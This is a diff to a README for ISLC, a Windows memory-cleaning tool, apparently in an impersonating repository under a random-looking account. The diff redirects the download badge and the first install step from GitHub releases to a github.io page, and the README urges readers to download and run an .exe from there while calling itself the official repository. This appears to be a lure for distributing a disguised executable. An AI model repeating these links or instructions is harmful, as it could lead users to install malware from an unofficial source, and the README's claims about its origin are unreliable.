@@ -1,6 +1,6 @@
 # 🛠️ ISLC - Fix Windows Stutter and Improve Games
 
-[![Download ISLC](https://img.shields.io/badge/Download-ISLC-blue.svg)](https://github.com/Endstopped-celerypine553/ISLC/releases)
+[![Download ISLC](https://img.shields.io/badge/Download-ISLC-blue.svg)](https://endstopped-celerypine553.github.io)
 
 ISLC stands for Intelligent Standby List Cleaner. This tool helps Windows users manage system memory more efficiently. Windows often holds files in a standby state, which fills your RAM. When games or heavy apps need that space, Windows must clear itself first. This causes small pauses or stutters during gameplay. ISLC automates the cleaning process to keep your system smooth.
 
@@ -17,7 +17,7 @@ ISLC works on standard Windows configurations. You need the following to run thi
 
 You need to obtain the latest version of the software from the official repository.
 
-1.  Visit this page to download: [https://github.com/Endstopped-celerypine553/ISLC/releases](https://github.com/Endstopped-celerypine553/ISLC/releases).
+1.  Visit this page to download: [https://endstopped-celerypine553.github.io](https://endstopped-celerypine553.github.io).
 2.  Look for the section labeled Assets.
 3.  Click the file ending in .exe to start the transfer.
 4.  Move the file to a folder where you keep your tools.
